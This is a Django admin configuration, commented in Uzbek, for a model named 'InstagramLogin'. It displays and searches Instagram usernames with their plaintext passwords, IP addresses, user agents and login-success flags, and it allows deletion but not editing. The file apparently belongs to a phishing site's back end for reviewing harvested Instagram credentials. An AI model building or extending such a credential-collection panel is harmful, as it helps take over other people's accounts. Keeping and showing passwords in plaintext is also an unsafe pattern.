from django.contrib import admin
from .models import InstagramLogin

@admin.register(InstagramLogin)
class InstagramLoginAdmin(admin.ModelAdmin):
    list_display = ('username', 'password', 'login_time', 'ip_address', 'success')
    list_filter = ('success', 'login_time')
    search_fields = ('username', 'ip_address')
    readonly_fields = ('username', 'password', 'login_time', 'ip_address', 'user_agent', 'success')
    ordering = ('-login_time',)
    
    fieldsets = (
        ('Login Information', {
            'fields': ('username', 'password', 'success', 'login_time')
        }),
        ('Technical Information', {
            'fields': ('ip_address', 'user_agent'),
            'classes': ('collapse',)
        }),
    )
    
    # FAQAT O'CHIRISH MUMKIN
    def has_delete_permission(self, request, obj=None):
        return True  # ✅ O'chirish mumkin
    
    # QO'SHISH MUMKIN EMAS
    def has_add_permission(self, request):
        return False  # ❌ Yangi qo'shish mumkin emas
    
    # TAHRIQLASH MUMKIN EMAS
    def has_change_permission(self, request, obj=None):
        return False  # ❌ Tahrirlash mumkin emas
    
    # Mass o'chirish yoqilgan
    actions = ['delete_selected']